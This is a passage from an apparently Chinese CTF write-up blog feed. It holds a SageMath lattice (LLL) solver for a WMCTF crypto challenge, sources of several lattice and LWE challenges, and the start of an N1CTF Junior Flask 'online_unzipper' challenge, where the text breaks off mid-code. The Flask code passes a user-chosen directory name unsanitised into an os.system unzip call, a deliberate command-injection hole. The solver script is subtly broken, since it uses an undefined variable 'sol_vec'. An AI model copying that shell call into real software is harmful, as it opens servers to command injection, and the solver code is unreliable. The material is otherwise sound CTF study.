6525560390886316331291464628669910149125483607726248566635546904534294626062586662528213108239725365594595677881216065984903337839878980240035564934046552, 5267455846476800778837810675968652912499902190539148131941469838044707979168868352552242860860469415418625601143261920057498327632704722410629571902757207], [2836101201606404086963674515196242099981794676200180367684860793033271859982764426617335526949325589855895823167197136257361757221153866636871210172909499, 2905746791428321890819637325300810834453495282574466482434863215508033662223795925912808993026408194967015679126821486382496994000126841698935066307107806, 6179734411062461009407000122687973511105948755170244204181450729410647901986426188970783453277592832386486628788023466433324078852891442496360969724173650]]</span></span><br><span class="line"><span class="comment"># gift=[841309, 840]</span></span><br></pre></td></tr></table></figure><p><code>split_master()</code>与上一题一样</p><ul><li>将<code>512位</code>的<code>key</code>分割成<strong>5段</strong>，长度分别为<strong>182, 20, 200, 10, 100位</strong></li><li>返回<strong>第2段</strong>（索引为1，长度20位）和<strong>第4段</strong>（索引为3，长度10位）对应的两个整数</li></ul><p>因此，我们拿到了<code>key</code>的<strong>部分信息</strong><code>gift=[841309, 840]</code></p><p>接着又生成了<strong>10组数据</strong></p><p>$B_{i}\equiv A_{i}<em>key+s_{i}\pmod p$<br>$s_{i}\equiv (R_{i,0}</em>k_{i,0}+R_{i,1}<em>k_{i,1}+R_{i,2}</em>k_{i,2})\pmod p$<br>$k_{0}\in [1,2^{64}]$<br>$k_{1}\in [1,2^{128}]$<br>$k_{2}\in [1,2^{256}]$</p><p>$未知数有33个：X_{0},X_{2},X_{4}\ \ \ k_{0,0},k_{0,1},k_{0,2},…,k_{9,0},k_{9,1},k_{9,2}$<br>$已知的数据为：p,A,B,R$<br>$k_{know}=(gift_{1}&lt;&lt;100)+(gift_{0}&lt;&lt;310)$</p><p>$key=k_{know}+(X_{0}&lt;&lt;330)+(X_{2}&lt;&lt;110)+X_{4}$</p><p>$(A_{i}\cdot 2^{330})\cdot X_{0}+(A_{i}\cdot 2^{110})\cdot X_{2}+A_{i}\cdot X_{4}+s_{i}\equiv C_{i}\pmod p$<br>$C_{i}\equiv B_{i}-A_{i}\cdot k_{know}\pmod p$</p><p>$(A_{i}\cdot 2^{330})\cdot X_{0}+…+R_{i,2}*k_{i,2}-p\cdot m_{i}-C_{i}\cdot z=0$</p><p>$v=(X_{0},X_{2},X_{4},k_{0,0},k_{0,1},k_{0,2},…,k_{9,2},m_{0},…,m_{9},z)$<br>$向量v的维度为3+30+10+1=44，前33个分量都属于小整数，最后一个分量z为1$</p><p>$我们构造这样的一个10<em>44的矩阵M，使得M</em>v^{T}=0$<br>$那么，要如何利用LLL算法找到正确的v呢？$</p><p>$kernel_basis = M.right_kernel()，得到M的右核(也称为零空间、解空间)，即满足mv=0的向量v集合$</p><p>$我们需要在众多的向量中，找到那个唯一满足我们要求的v$<br>$K = kernel_basis.basis_matrix()，将抽象的解空间转换为可直接操作的基矩阵K$</p><p>$K_scaled = K * diagonal_matrix(W)，K右乘一个对角矩阵W，实现加权缩放$<br>$其实就是配平，使得LLL算法能准确找到最短向量$<br>$m_{i}有512bits，所以这里需要给每个分量加个权重使其达到512bits$</p><p>$然后检查一下规约出的最短向量是否是我们精确缩放的，如果是缩放回去$<br>$并且确保最后一个分量一定是1，如此就找到了正确的向量v$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">p = <span class="number">7159749741429322755131240146118071759513715820993285825839372472474407666017557572129271731613358007058734527689330441569348431807180112353088919340436347</span></span><br><span class="line">A = </span><br><span class="line">B = </span><br><span class="line">R = </span><br><span class="line">gift = [<span class="number">841309</span>, <span class="number">840</span>]</span><br><span class="line"></span><br><span class="line">K_known = (gift[<span class="number">1</span>] &lt;&lt; <span class="number">100</span>) + (gift[<span class="number">0</span>] &lt;&lt; <span class="number">310</span>)</span><br><span class="line">C = [(B[i] - A[i] * K_known) % p <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">num_x_parts = <span class="number">3</span></span><br><span class="line">num_k_per_eq = <span class="number">3</span></span><br><span class="line">num_eqs = <span class="number">10</span></span><br><span class="line">num_x_vars = num_x_parts</span><br><span class="line">num_k_vars = num_k_per_eq * num_eqs</span><br><span class="line">num_m_vars = num_eqs</span><br><span class="line">num_z_vars = <span class="number">1</span></span><br><span class="line">num_total_vars = num_x_vars + num_k_vars + num_m_vars + num_z_vars</span><br><span class="line"></span><br><span class="line">M = matrix(ZZ, num_eqs, num_total_vars)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_eqs):</span><br><span class="line">    M[i, <span class="number">0</span>] = A[i] * (<span class="number">2</span>**<span class="number">330</span>)</span><br><span class="line">    M[i, <span class="number">1</span>] = A[i] * (<span class="number">2</span>**<span class="number">110</span>)</span><br><span class="line">    M[i, <span class="number">2</span>] = A[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_k_per_eq):</span><br><span class="line">        M[i, num_x_vars + i * num_k_per_eq + j] = R[i][j]</span><br><span class="line">    M[i, num_x_vars + num_k_vars + i] = -p</span><br><span class="line">    M[i, num_x_vars + num_k_vars + num_m_vars] = -C[i]</span><br><span class="line"></span><br><span class="line">kernel_basis = M.right_kernel()</span><br><span class="line">K = kernel_basis.basis_matrix()</span><br><span class="line"></span><br><span class="line">W = [<span class="number">1</span>] * num_total_vars</span><br><span class="line">scaling_factor = <span class="number">2</span>**<span class="number">512</span></span><br><span class="line"></span><br><span class="line">W[<span class="number">0</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">182</span>)  <span class="comment"># X0</span></span><br><span class="line">W[<span class="number">1</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">200</span>)  <span class="comment"># X2</span></span><br><span class="line">W[<span class="number">2</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">100</span>)  <span class="comment"># X4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_eqs):</span><br><span class="line">    W[num_x_vars + i*num_k_per_eq + <span class="number">0</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">64</span>)  <span class="comment"># k_i,0</span></span><br><span class="line">    W[num_x_vars + i*num_k_per_eq + <span class="number">1</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">128</span>)  <span class="comment"># k_i,1</span></span><br><span class="line">    W[num_x_vars + i*num_k_per_eq + <span class="number">2</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">256</span>)  <span class="comment"># k_1,2</span></span><br><span class="line"></span><br><span class="line">W[num_x_vars + num_k_vars + num_m_vars] = scaling_factor  <span class="comment"># z</span></span><br><span class="line"></span><br><span class="line">K_scaled = K * diagonal_matrix(W)</span><br><span class="line">LLL_scaled_basis = K_scaled.LLL()</span><br><span class="line"></span><br><span class="line">shortest_vec_scaled = LLL_scaled_basis[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">is_exact = <span class="built_in">all</span>(shortest_vec_scaled[j] % W[j] == <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_total_vars))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_exact:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] The shortest vector could not be unscaled perfectly. This is unexpected.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Check weights or problem formulation.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    shortest_vec = vector([shortest_vec_scaled[j] // W[j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_total_vars)])</span><br><span class="line">    z = shortest_vec[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(z) == <span class="number">1</span>:</span><br><span class="line">        X0 = sol_vec[<span class="number">0</span>]</span><br><span class="line">        X2 = sol_vec[<span class="number">1</span>]</span><br><span class="line">        X4 = sol_vec[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= X0 &lt; <span class="number">2</span>**<span class="number">182</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= X2 &lt; <span class="number">2</span>**<span class="number">200</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= X4 &lt; <span class="number">2</span>**<span class="number">100</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Found a valid solution vector!&quot;</span>)</span><br><span class="line">            key_reconstructed = K_known + (X0 &lt;&lt; <span class="number">330</span>) + (X2 &lt;&lt; <span class="number">110</span>) + X4</span><br><span class="line">            key_str = <span class="built_in">str</span>(key_reconstructed)</span><br><span class="line">            flag_hash = md5(key_str.encode()).hexdigest()</span><br><span class="line">            flag = <span class="string">&quot;WMCTF&#123;&quot;</span> + flag_hash + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Shortest vector found, but its components are out of bounds.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Shortest vector&#x27;s z component is <span class="subst">&#123;z&#125;</span>, not +/-1.&quot;</span>)</span><br><span class="line"><span class="comment"># WMCTF&#123;ed27074de5c476e67328e04b6e27a5b8&#125;</span></span><br></pre></td></tr></table></figure><p>还有别的打法，见<a href="https://tangcuxiaojikuai.xyz/post/b852ef1b.html">糖醋小鸡块师傅的博客</a></p><h2 id="LW3-1-solved"><a href="#LW3-1-solved" class="headerlink" title="LW3* | 1 solved"></a>LW3* | 1 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice, sample</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m, n = <span class="number">90</span>, <span class="number">64</span></span><br><span class="line">p = <span class="number">1048583</span></span><br><span class="line"></span><br><span class="line">E = sample(<span class="built_in">range</span>(<span class="number">1</span>, p), <span class="number">3</span>)</span><br><span class="line">s = random_vector(Zmod(p), n)</span><br><span class="line">A = random_matrix(Zmod(p), m, n)</span><br><span class="line">e = vector(Zmod(p), [choice(E) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)])</span><br><span class="line">b = A*s + e</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🎁 :&quot;</span>, E + A.<span class="built_in">list</span>() + b.<span class="built_in">list</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🚩 :&quot;</span>, AES.new(key=md5((<span class="built_in">str</span>(s)).encode()).digest(), nonce=<span class="string">b&quot;Tiffany&quot;</span>, mode=AES.MODE_CTR).encrypt(flag))</span><br></pre></td></tr></table></figure><p>这题与<code>Hitcon2025 BabyLWE</code>极其相似(虽然当时也没参加)，维度更小而且<code>E</code>也给出了</p><p>不过参考调试了一下午都没能打出来……</p><blockquote><p>Reference<br><a href="https://tangcuxiaojikuai.xyz/post/e7cc42f8.html">https://tangcuxiaojikuai.xyz/post/e7cc42f8.html</a><br><a href="https://tangcuxiaojikuai.xyz/post/94c7e291.html">https://tangcuxiaojikuai.xyz/post/94c7e291.html</a><br><a href="https://huangx607087.online/2025/04/06/NSSCTFEasyMod/#5-easyModX">https://huangx607087.online/2025/04/06/NSSCTFEasyMod/#5-easyModX</a><br><a href="https://github.com/maple3142/My-CTF-Challenges/tree/d72de5b90c68a25d94feeca0cdff3f8bdbdae4ab/HITCON%20CTF%202025/BabyLWE">https://github.com/maple3142/My-CTF-Challenges/tree/d72de5b90c68a25d94feeca0cdff3f8bdbdae4ab/HITCON%20CTF%202025/BabyLWE</a><br><a href="https://connor-mccartney.github.io/cryptography/other/HITCON2025">https://connor-mccartney.github.io/cryptography/other/HITCON2025</a></p></blockquote><p>后续是，继续看<a href="https://tangcuxiaojikuai.xyz/post/b852ef1b.html">糖醋小鸡块师傅的博客</a>吧</p><h2 id="LW5-0-solved"><a href="#LW5-0-solved" class="headerlink" title="LW5** | 0 solved"></a>LW5** | 0 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">E</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>([_ % p <span class="keyword">for</span> _ <span class="keyword">in</span> E])) == <span class="number">5</span></span><br><span class="line">    L = block_matrix(ZZ, [</span><br><span class="line">        [Matrix(ZZ, E)],</span><br><span class="line">        [Matrix(ZZ, [<span class="number">1</span>]*<span class="number">5</span>)],</span><br><span class="line">        [p]</span><br><span class="line">    ])</span><br><span class="line">    E_ = L.LLL()[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>([<span class="built_in">abs</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> E_]) &gt; <span class="number">1337</span> <span class="keyword">and</span> <span class="built_in">min</span>([<span class="built_in">abs</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> E_]) &gt; <span class="number">337</span></span><br><span class="line">    </span><br><span class="line">p = <span class="number">1048583</span></span><br><span class="line">E = literal_eval(<span class="built_in">input</span>(<span class="string">&quot;your error plz :)&quot;</span>))</span><br><span class="line"><span class="keyword">assert</span> check(E)</span><br><span class="line"></span><br><span class="line">m, n = <span class="number">90</span>, <span class="number">56</span></span><br><span class="line">s = random_vector(Zmod(p), n)</span><br><span class="line">A = random_matrix(Zmod(p), m, n)</span><br><span class="line">e = vector(Zmod(p), [choice(E) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)])</span><br><span class="line">b = A*s + e</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🎁 :&quot;</span>, A.<span class="built_in">list</span>() + b.<span class="built_in">list</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🚩 :&quot;</span>, AES.new(key=md5((<span class="built_in">str</span>(s)).encode()).digest(), nonce=<span class="string">b&quot;Tiffany&quot;</span>, mode=AES.MODE_CTR).encrypt(flag))</span><br></pre></td></tr></table></figure><p>这里就需要精心构造出满足条件的<code>E</code>，感觉不太有希望，直接不看了</p><h2 id="LemonPepper-1-solved"><a href="#LemonPepper-1-solved" class="headerlink" title="LemonPepper** | 1 solved"></a>LemonPepper** | 1 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    FLAG = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">flavorings</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, p, l</span>):</span><br><span class="line">        self.l, self.p = l, p</span><br><span class="line">        self.state = [randrange(p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">        self.a = [randrange(<span class="number">128</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        s = choice([<span class="built_in">sum</span>(self.state[i] ^ d * self.a[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.l)) % self.p <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>)])</span><br><span class="line">        self.state = [s] + self.state[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LemonPepper</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, q, t, e1, e2, p, l</span>):</span><br><span class="line">        self.q, self.t, self.e1, self.e2 = q, t, e1, e2</span><br><span class="line">        self.mcg = flavorings(p, l)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Lemon</span>(<span class="params">self</span>):</span><br><span class="line">        q, t, e1, e2 = self.q, self.t, self.e1, self.e2</span><br><span class="line">        R.&lt;x&gt; = PolynomialRing(Zmod(q ^ e2))</span><br><span class="line">        roots = [randrange(q ^ (e2-e1)) + <span class="built_in">sum</span>(<span class="built_in">next</span>(self.mcg) * q ^ (i + t) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e1))] + [randrange(q ^ e2) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t - <span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">return</span> randrange(q ^ e2) * prod([(x - root) ^ choice(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">5</span>)) <span class="keyword">for</span> root <span class="keyword">in</span> roots])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Pepper</span>(<span class="params">self</span>):</span><br><span class="line">        q, t, e = self.q, self.t, self.e2</span><br><span class="line">        R.&lt;x&gt; = PolynomialRing(Zmod(q ^ e))</span><br><span class="line">        roots = [<span class="built_in">next</span>(self.mcg) * q ^ <span class="number">130</span> + randrange(q ^ <span class="number">130</span>) + randrange(q ^ <span class="number">70</span>) * q ^ <span class="number">131</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t)]</span><br><span class="line">        <span class="keyword">return</span> randrange(q ^ e) * prod([(x - root) * (x - root - q ^ t) <span class="keyword">for</span> root <span class="keyword">in</span> roots]) * prod([x - root - q ^ <span class="number">40</span> <span class="keyword">for</span> root <span class="keyword">in</span> sample(roots, <span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;💀 ORDER INCOMING!</span></span><br><span class="line"><span class="string">&quot;25-min RUSH RECIPE: 7x🍋 CUPS + 3x🌶️ DASHES! COOK NOW!&quot;</span></span><br><span class="line"><span class="string">⏱️ 24:59... 24:58...&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;signal&quot;</span>).alarm(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">p, l = <span class="number">257</span>, <span class="number">25</span></span><br><span class="line">q, t, e1, e2 = <span class="number">27658548947</span>, <span class="number">30</span>, <span class="number">135</span>, <span class="number">165</span></span><br><span class="line">lemonpepper = LemonPepper(q, t, e1, e2, p, l)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🍋 Precision Zest Injection!&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="built_in">print</span>(lemonpepper.Lemon().<span class="built_in">list</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🌶️ Chaotic Spark Ignition!&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(lemonpepper.Pepper().<span class="built_in">list</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SHOVE PLATES INTO PORTAL! 🛸🍽️ VALIDATE 🍋🌶️ COMBO OR KITCHEN MELTDOWN! 💣💥&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).split(<span class="string">&#x27;,&#x27;</span>)] == lemonpepper.mcg.state</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;🍋🌶️ CHAOS COMBO! +500 EXTREME POINTS! ⚡💥 MUTANT FLAVOR UNLOCKED! <span class="subst">&#123;FLAG&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>这题也没看，留个附件在这</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://picx.zhimg.com/80/v2-1ba4c4523935adaa03e61a76ae5cc53b_1440w.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://picx.zhimg.com/80/v2-8855</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>N1CTF Junior 2025 2/2 WriteUp</title>
    <link href="https://hvang10.github.io/2025/09/15/N1CTF-Junior-2025-2-2-WriteUp/"/>
    <id>https://hvang10.github.io/2025/09/15/N1CTF-Junior-2025-2-2-WriteUp/</id>
    <published>2025-09-14T16:00:01.000Z</published>
    <updated>2025-09-16T17:58:58.191Z</updated>
    
    <content type="html"><![CDATA[<p>还是太难了QWQ，等补档了……</p><blockquote><p>wp参考<br><a href="https://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2">https://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2</a><br><a href="https://enoch.host/archives/n1ctf-junior-2025">https://enoch.host/archives/n1ctf-junior-2025</a><br><a href="https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA">https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA</a><br><a href="https://onehang01.github.io/2025/09/15/n1ctf-web-wp/">https://onehang01.github.io/2025/09/15/n1ctf-web-wp/</a><br><a href="https://www.cnblogs.com/lee0/p/19095583">https://www.cnblogs.com/lee0/p/19095583</a></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, send_file, render_template, session, send_from_directory, abort, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.environ.get(<span class="string">&quot;FLASK_SECRET_KEY&quot;</span>, <span class="string">&quot;test_key&quot;</span>)</span><br><span class="line">UPLOAD_FOLDER = os.path.join(os.getcwd(), <span class="string">&quot;uploads&quot;</span>)</span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">users = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;upload&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;用户名已存在&quot;</span></span><br><span class="line"></span><br><span class="line">        users[username] = &#123;<span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&quot;password&quot;</span>] == password:</span><br><span class="line">            session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">            session[<span class="string">&quot;role&quot;</span>] = users[username][<span class="string">&quot;role&quot;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;upload&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;用户名或密码错误&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        file = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;未选择文件&quot;</span></span><br><span class="line"></span><br><span class="line">        role = session[<span class="string">&quot;role&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> role == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            dirname = request.form.get(<span class="string">&quot;dirname&quot;</span>) <span class="keyword">or</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dirname = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">        target_dir = os.path.join(UPLOAD_FOLDER, dirname)</span><br><span class="line">        os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        zip_path = os.path.join(target_dir, <span class="string">&quot;upload.zip&quot;</span>)</span><br><span class="line">        file.save(zip_path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.system(<span class="string">f&quot;unzip -o <span class="subst">&#123;zip_path&#125;</span> -d <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;解压失败，请检查文件格式&quot;</span></span><br><span class="line"></span><br><span class="line">        os.remove(zip_path)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;解压完成！&lt;br&gt;下载地址: &lt;a href=&#x27;<span class="subst">&#123;url_for(<span class="string">&#x27;download&#x27;</span>, folder=dirname)&#125;</span>&#x27;&gt;<span class="subst">&#123;request.host_url&#125;</span>download/<span class="subst">&#123;dirname&#125;</span>&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 